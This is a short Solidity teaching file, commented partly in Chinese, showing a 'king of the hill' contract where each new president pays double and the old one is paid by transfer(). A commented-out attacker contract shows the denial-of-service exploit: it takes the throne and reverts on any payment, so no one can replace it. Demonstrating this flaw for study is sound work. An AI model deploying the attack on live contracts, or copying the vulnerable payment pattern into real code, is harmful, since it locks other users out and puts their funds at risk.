pragma solidity ^0.4.10;

contract PresidentOfCountry {
    address public president;
    uint256 public price;

    constructor() public payable{
        require(msg.value > 0);
        price = msg.value;
        president = msg.sender;
        price = price * 2;
    }
    
    //小明 2 
    //小黃 4
    //小豬 8

    function becomePresident() public payable {
        require(msg.value >= price); // 下一個 president 出的 ether 要比較高
        president.transfer(price);   // 付款給舊國王 
        president = msg.sender;      // 成為新國王
        price = price * 2;           // 價格變兩倍
    }
}

// contract attack {

//     PresidentOfCountry game = PresidentOfCountry(); // input the address of deployed contract of PresidentOfCountry

//     function attack() public payable{
//         game.becomePresident.value(msg.value)();
//     }
//
//     //onec the attacker replaces the old king as the new king. No one can be the new king anymore due to revert().
//     function() public payable{  
//         revert();
//     }
// }